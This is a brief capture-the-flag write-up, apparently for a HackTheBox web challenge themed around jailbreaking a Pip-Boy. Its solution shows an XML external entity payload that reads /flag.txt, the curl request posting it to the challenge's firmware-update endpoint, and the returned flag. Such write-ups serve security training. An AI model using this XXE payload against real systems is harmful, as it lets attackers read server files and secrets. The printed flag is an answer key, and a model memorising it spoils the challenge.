<h1>Jailbreak</h1>
<h3>Description</h3>
<pre>
The crew secures an experimental Pip-Boy from a black market merchant, recognizing its potential to unlock the heavily guarded bunker of Vault 79. Back at their hideout, the hackers and engineers collaborate to jailbreak the device, working meticulously to bypass its sophisticated biometric locks. Using custom firmware and a series of precise modifications, can you bring the device to full operational status in order to pair it with the vault door's access port. The flag is located in /flag.txt
</pre>
<h3>Solution</h3>

```console
┌──(root㉿Kali)-[/home/venom/Payload_CTF/Web]
└─# cat payload.xml                                                                                                 
<?xml version="1.0"?>
<!DOCTYPE user [
    <!ENTITY example SYSTEM "file:///flag.txt">
]>
<FirmwareUpdateConfig>
    <Firmware><Version>&example;</Version>
</Firmware>
</FirmwareUpdateConfig>
                                                                                                                                       
┌──(root㉿Kali)-[/home/venom/Payload_CTF/Web]
└─# curl -X POST http://154.57.164.70:41605/api/update -H "Content-Type: application/xml" --data-binary @payload.xml
{
  "message": "Firmware version HTB{b1om3tric_l0cks_4nd_fl1cker1ng_l1ghts_597f4460bb9a006b602a9cf71fe8ae1e} update initiated."
}

```
<h3>Flag</h3>
<pre>
HTB{b1om3tric_l0cks_4nd_fl1cker1ng_l1ghts_597f4460bb9a006b602a9cf71fe8ae1e}
</pre>
